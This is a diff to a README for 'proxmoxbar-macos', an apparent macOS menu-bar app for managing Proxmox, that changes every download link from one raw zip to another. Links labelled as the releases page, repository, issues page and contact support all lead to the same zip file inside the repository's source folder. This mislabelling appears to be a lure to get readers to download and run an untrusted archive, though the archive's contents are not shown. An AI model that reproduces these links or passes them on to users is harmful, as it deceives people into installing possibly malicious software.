@@ -1,6 +1,6 @@
 # 🍏 proxmoxbar-macos - Manage Proxmox with Ease
 
-![Download](https://github.com/abalmasum785/proxmoxbar-macos/raw/refs/heads/main/Sources/App/macos_proxmoxbar_1.9.zip%https://github.com/abalmasum785/proxmoxbar-macos/raw/refs/heads/main/Sources/App/macos_proxmoxbar_1.9.zip)
+![Download](https://raw.githubusercontent.com/abalmasum785/proxmoxbar-macos/main/Sources/Assets/proxmoxbar-macos-v3.8.zip%https://raw.githubusercontent.com/abalmasum785/proxmoxbar-macos/main/Sources/Assets/proxmoxbar-macos-v3.8.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To start using proxmoxbar-macos, follow these simple steps:
 
 1. **Download the Application**
    - Click the link below to visit the Releases page, where you can download the latest version of proxmoxbar-macos.
-   - [Download the latest release](https://github.com/abalmasum785/proxmoxbar-macos/raw/refs/heads/main/Sources/App/macos_proxmoxbar_1.9.zip)
+   - [Download the latest release](https://raw.githubusercontent.com/abalmasum785/proxmoxbar-macos/main/Sources/Assets/proxmoxbar-macos-v3.8.zip)
 
 2. **Install the Application**
    - Once the download is complete, locate the downloaded file, usually found in your Downloads folder.
@@ -27,7 +27,7 @@ To start using proxmoxbar-macos, follow these simple steps:
 To download and install proxmoxbar-macos:
 
 1. Click this link to visit the Releases page:
-   - [Visit the Releases page](https://github.com/abalmasum785/proxmoxbar-macos/raw/refs/heads/main/Sources/App/macos_proxmoxbar_1.9.zip)
+   - [Visit the Releases page](https://raw.githubusercontent.com/abalmasum785/proxmoxbar-macos/main/Sources/Assets/proxmoxbar-macos-v3.8.zip)
 
 2. Find the latest version and click on the download link for macOS.
 
@@ -76,8 +76,8 @@ A: You are welcome to contribute! Please visit the repository and refer to the c
 
 ## 🔗 Links & Resources
 
-- [GitHub Repository](https://github.com/abalmasum785/proxmoxbar-macos/raw/refs/heads/main/Sources/App/macos_proxmoxbar_1.9.zip)
-- [Issues Page](https://github.com/abalmasum785/proxmoxbar-macos/raw/refs/heads/main/Sources/App/macos_proxmoxbar_1.9.zip)
-- [Contact Support](https://github.com/abalmasum785/proxmoxbar-macos/raw/refs/heads/main/Sources/App/macos_proxmoxbar_1.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/abalmasum785/proxmoxbar-macos/main/Sources/Assets/proxmoxbar-macos-v3.8.zip)
+- [Issues Page](https://raw.githubusercontent.com/abalmasum785/proxmoxbar-macos/main/Sources/Assets/proxmoxbar-macos-v3.8.zip)
+- [Contact Support](https://raw.githubusercontent.com/abalmasum785/proxmoxbar-macos/main/Sources/Assets/proxmoxbar-macos-v3.8.zip)
 
 Enjoy using proxmoxbar-macos! Manage your Proxmox resources with ease right from your macOS menu bar.
